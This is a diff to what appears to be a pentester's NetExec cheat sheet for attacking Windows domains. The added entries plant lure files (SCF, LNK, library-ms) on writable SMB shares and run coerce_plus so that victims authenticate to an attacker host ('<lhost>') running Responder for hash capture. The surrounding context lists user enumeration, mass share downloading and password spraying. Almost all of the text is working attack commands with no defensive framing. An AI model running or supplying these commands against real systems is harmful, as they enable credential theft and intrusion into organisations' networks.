@@ -31,11 +31,21 @@ nxc ldap <ip> -u '<user>' <auth> --users | tee /dev/tty | awk '/-Username-/{p=1;
 cat <outfile>
 ```
 
+## writable share all in one (expects responder)
+```
+nxc smb <ip> -u '<user>' <auth> -M drop-sc -M slinky -M scuffy -M drop-library-ms -o SERVER=<lhost> NAME=<filename|IMPORTANT> FILENAME=<filename|IMPORTANT> URL=\\\\<lhost>\\a
+```
+
 ## spider plus
 ```
 nxc smb <ip> -u '<user>' <auth> -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=.
 
 cat <ip>.json | jq '. | map_values(keys)'
+```
+
+## coerce_plus
+```
+nxc smb <ip> -u '<user>' <auth> -M coerce_plus -o M=<method|pe> L=<lhost>
 ```
 
 ## password spray
